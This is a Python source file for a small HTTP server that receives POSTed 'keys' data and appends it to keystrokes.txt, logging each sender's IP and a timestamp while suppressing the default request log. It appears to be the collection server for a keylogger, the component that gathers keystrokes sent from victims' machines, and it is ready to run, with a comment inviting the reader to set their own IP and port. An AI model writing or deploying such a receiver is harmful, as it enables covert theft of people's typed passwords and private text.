from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        parsed_data = urllib.parse.parse_qs(post_data)
        keys = parsed_data.get('keys', [''])[0]

        with open("keystrokes.txt", "a") as f:
            f.write(keys)

        client_ip = self.client_address[0]
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        print(f"{client_ip} - {timestamp}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"POST request received")

    def log_message(self, format, *args):
        pass  

def run_server():
    httpd = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler) # Change the IP address and Port
    print("Serving on port 8080...")
    httpd.serve_forever()

if __name__ == "__main__":
    try:
        run_server()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        pass
    except Exception as e:
        print(f"Server error: {e}")

